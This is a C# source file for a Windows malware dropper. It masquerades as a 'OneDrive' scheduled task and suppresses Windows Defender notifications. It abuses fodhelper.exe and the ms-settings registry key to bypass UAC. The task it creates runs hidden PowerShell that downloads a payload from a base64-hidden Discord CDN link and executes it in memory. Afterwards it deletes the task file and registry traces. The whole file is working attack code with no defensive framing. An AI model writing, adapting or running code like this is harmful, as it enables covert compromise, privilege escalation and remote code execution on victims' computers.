using System;
using System.IO;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace dropper
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = @"/delete /tn OneDrive /f",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            string ppath = $"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\\Microsoft\\OneDrive";
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", "Enabled", 0);

            File.WriteAllText($"{ppath}\\temp.xml",
@"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-noprofile -windowstyle hidden -command [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvOTU1ODUwODkzMTEzMjk4OTU3Lzk1ODI3MTM5ODkxNTIxMTM0NS9oaS5leGU=')))).EntryPoint.Invoke($null, (, [string[]] ('" + args[0] + @"', '" + args[1] + @"', '" + args[2] + @"')))</Arguments>
    </Exec>
  </Actions>
</Task>");

            Process.Start(new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = @"/c reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command /d ""schtasks /create /tn OneDrive /xml " + $"{ppath}\\temp.xml" + @""" /t REG_SZ /f",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            Process.Start(new ProcessStartInfo()
            {
                FileName = "fodhelper.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            Thread.Sleep(1000);

            Process.Start(new ProcessStartInfo()
            {
                FileName = "schtasks.exe",
                Arguments = "/run /i /tn OneDrive",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();

            File.Delete($"{ppath}\\temp.xml");
            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter", true).DeleteValue("Enabled");
            Registry.CurrentUser.DeleteSubKey(@"Software\Classes\ms-settings\shell\open\command");
        }
    }
}